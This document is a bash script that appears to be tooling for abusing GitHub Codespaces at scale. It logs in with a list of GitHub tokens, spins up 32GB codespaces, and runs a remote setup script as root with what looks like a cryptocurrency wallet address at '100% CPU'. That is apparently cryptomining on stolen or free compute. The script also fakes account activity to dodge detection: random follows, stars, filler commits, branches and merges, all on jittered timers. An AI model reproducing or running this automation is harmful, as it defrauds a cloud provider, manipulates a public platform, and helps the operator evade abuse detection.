REPO="niaalae/dock"
BRANCH="main"
MACHINE_TYPE="standardLinux32gb"
# Updated to 100% CPU as requested
SETUP_CMD='sudo /workspaces/dock/setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F 100'
SEED_REPO_NAME="seeding-repo"

log_msg() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

if [ $# -lt 1 ]; then
  echo "Usage: $0 <gh_token> [gh_token ...] or $0 <token_file>"
  exit 1
fi

# If first arg is a file, read tokens from it
if [ -f "$1" ]; then
  TOKENS=( $(grep -v '^#' "$1" | grep -v '^$') )
else
  TOKENS=( "$@" )
fi

run_instance() {
  local GH_TOKEN="$1"
  # Use a unique config directory for each instance to avoid auth conflicts
  # Use a hash of the token to keep it consistent but unique
  local T_HASH=$(echo -n "$GH_TOKEN" | md5sum | head -c 8)
  export GH_CONFIG_DIR="/tmp/.gh_config_${T_HASH}"
  mkdir -p "$GH_CONFIG_DIR"
  chmod 700 "$GH_CONFIG_DIR"

  # Login with the specific config dir
  echo "$GH_TOKEN" | gh auth login --with-token
  if [ $? -ne 0 ]; then
    log_msg "GitHub authentication failed for token ${GH_TOKEN:0:10}..."
    return 1
  fi

  local GH_USER=$(gh api user -q .login)
  log_msg "Logged in as $GH_USER"

  local WORKER_NAME="${GH_USER}-${T_HASH:0:6}"
  log_msg "Using worker name: $WORKER_NAME"

  ensure_codespace() {
    # Reverting to a more compatible listing method that doesn't rely on JSON 'branch' field
    # Format: NAME  REPOSITORY  BRANCH  STATE  LAST_USED
    local CODESPACES=$(gh codespace list)
    CODESPACE_NAME=$(echo "$CODESPACES" | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
    
    if [ -z "$CODESPACE_NAME" ]; then
      log_msg "No existing codespace found for $REPO ($BRANCH). Creating a new one..."
      # Attempt to create
      local CREATE_OUTPUT
      CREATE_OUTPUT=$(gh codespace create -R "$REPO" -b "$BRANCH" -m "$MACHINE_TYPE" 2>&1)
      
      if echo "$CREATE_OUTPUT" | grep -q "HTTP 402"; then
        log_msg "Billing issue detected for $GH_USER. Exiting."
        exit 1
      fi
      
      # Re-check after creation
      sleep 5
      CODESPACE_NAME=$(gh codespace list | grep "$REPO" | grep "$BRANCH" | head -n1 | awk '{print $1}')
      
      if [ -z "$CODESPACE_NAME" ]; then
        log_msg "Failed to create/find codespace for $GH_USER. Output: $CREATE_OUTPUT"
        return 1
      fi
    fi
    
    log_msg "Using codespace: $CODESPACE_NAME"
    # Update worker name to include codespace suffix for dashboard uniqueness
    WORKER_NAME="${GH_USER}-${T_HASH:0:4}-${CODESPACE_NAME: -4}"
    log_msg "Worker name for dashboard: $WORKER_NAME"

    # Wait for setup.sh with timeout
    local MAX_WAIT=30
    local WAIT_COUNT=0
    while [ $WAIT_COUNT -lt $MAX_WAIT ]; do
      if gh codespace ssh -c "$CODESPACE_NAME" -- ls /workspaces/dock/setup.sh >/dev/null 2>&1; then
        log_msg "setup.sh found."
        return 0
      fi
      
      # Check if codespace still exists
      if ! gh codespace list | grep -q "$CODESPACE_NAME"; then
        log_msg "Codespace $CODESPACE_NAME disappeared. Retrying..."
        return 2
      fi
      
      sleep 10
      WAIT_COUNT=$((WAIT_COUNT + 1))
    done
    return 1
  }

  while true; do
    ensure_codespace
    local RET=$?
    [ $RET -eq 0 ] && break
    [ $RET -eq 1 ] && return 1
    sleep 5
  done

  sync_and_run() {
    log_msg "Starting setup.sh on $CODESPACE_NAME..."
    # Improved quoting to prevent 'sudo' usage errors on the remote side
    local remote_cmd="sudo bash /workspaces/dock/setup.sh 49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F 100 $WORKER_NAME; tail -f /dev/null"
    gh codespace ssh -c "$CODESPACE_NAME" -- "$remote_cmd" &
    SSH_PID=$!
  }
  
  sync_and_run

  local CHECK_COUNT=0
  while true; do
    # Random sleep between 8 and 12 minutes (jitter)
    local SLEEP_TIME=$((540 + RANDOM % 120))
    sleep $SLEEP_TIME
    
    CHECK_COUNT=$((CHECK_COUNT + 1))
    log_msg "Check #$CHECK_COUNT for $GH_USER"

    # 1. Verify codespace and SSH
    if ! gh codespace list | grep -q "$CODESPACE_NAME"; then
      log_msg "Codespace $CODESPACE_NAME lost. Recreating..."
      kill $SSH_PID 2>/dev/null
      ensure_codespace && sync_and_run
      continue
    fi

    if ! kill -0 $SSH_PID 2>/dev/null; then
      log_msg "SSH session died. Reconnecting..."
      sync_and_run
    fi

    # 2. Check Docker Health
    local DOCKER_RUNNING=$(gh codespace ssh -c "$CODESPACE_NAME" -- docker ps -q 2>/dev/null)
    if [ -z "$DOCKER_RUNNING" ]; then
      log_msg "Docker inactive. Rerunning setup.sh..."
      kill $SSH_PID 2>/dev/null
      sync_and_run
    fi

    # 3. Seeding Logic (Every 3 checks ~30 mins)
    if [ $((CHECK_COUNT % 3)) -eq 0 ]; then
      log_msg "Seeding activities for $GH_USER..."
      
      # Follow random users
      local RANDOM_USERS=$(gh api "search/users?q=type:user&per_page=10&page=$((RANDOM % 20 + 1))" -q '.items[].login' 2>/dev/null | shuf -n $((RANDOM % 3 + 1)))
      for U in $RANDOM_USERS; do
        [ "$U" != "$GH_USER" ] && gh api -X PUT "user/following/$U" >/dev/null 2>&1
      done

      # Star random repos
      local RANDOM_REPOS=$(gh api "search/repositories?q=stars:>100&per_page=10&page=$((RANDOM % 20 + 1))" -q '.items[].full_name' 2>/dev/null | shuf -n $((RANDOM % 2 + 1)))
      for R in $RANDOM_REPOS; do
        gh api -X PUT "user/starred/$R" >/dev/null 2>&1
      done

      # Repo & Commits
      local REPO_EXISTS=$(gh repo list --json name -q ".[] | select(.name == \"$SEED_REPO_NAME\") | .name" 2>/dev/null)
      if [ -z "$REPO_EXISTS" ]; then
        gh repo create "$SEED_REPO_NAME" --public --add-readme >/dev/null 2>&1
        sleep 5
      fi

      local NUM_COMMITS=$((RANDOM % 3 + 1))
      for i in $(seq 1 $NUM_COMMITS); do
        gh api -X PUT "repos/$GH_USER/$SEED_REPO_NAME/contents/update_${CHECK_COUNT}_${i}.txt" \
          -F message="Update logs $CHECK_COUNT.$i" \
          -F content=$(echo "Sync at $(date)" | base64) >/dev/null 2>&1
      done
    fi

    # 4. Branching & Merging (Cycle reset at 20)
    if [ $CHECK_COUNT -eq 15 ]; then
      local NEW_BRANCH="dev-$(date +%s)"
      local MAIN_SHA=$(gh api "repos/$GH_USER/$SEED_REPO_NAME/git/ref/heads/main" -q '.object.sha' 2>/dev/null)
      if [ -n "$MAIN_SHA" ]; then
        gh api -X POST "repos/$GH_USER/$SEED_REPO_NAME/git/refs" -F ref="refs/heads/$NEW_BRANCH" -F sha="$MAIN_SHA" >/dev/null 2>&1
        gh api -X PUT "repos/$GH_USER/$SEED_REPO_NAME/contents/feature.txt" \
          -F message="Feature implementation" \
          -F content=$(echo "Feature data" | base64) \
          -F branch="$NEW_BRANCH" >/dev/null 2>&1
      fi
    fi

    if [ $CHECK_COUNT -ge 20 ]; then
      local LATEST_BRANCH=$(gh api "repos/$GH_USER/$SEED_REPO_NAME/branches" -q '.[].name' 2>/dev/null | grep "dev-" | tail -n 1)
      if [ -n "$LATEST_BRANCH" ]; then
        gh api -X POST "repos/$GH_USER/$SEED_REPO_NAME/merges" -F base="main" -F head="$LATEST_BRANCH" -F commit_message="Merge $LATEST_BRANCH" >/dev/null 2>&1
      fi
      CHECK_COUNT=0
    fi
  done
}

for TOKEN in "${TOKENS[@]}"; do
  run_instance "$TOKEN" &
  sleep 15 # Increased stagger delay to ensure config dirs are fully ready
done
wait

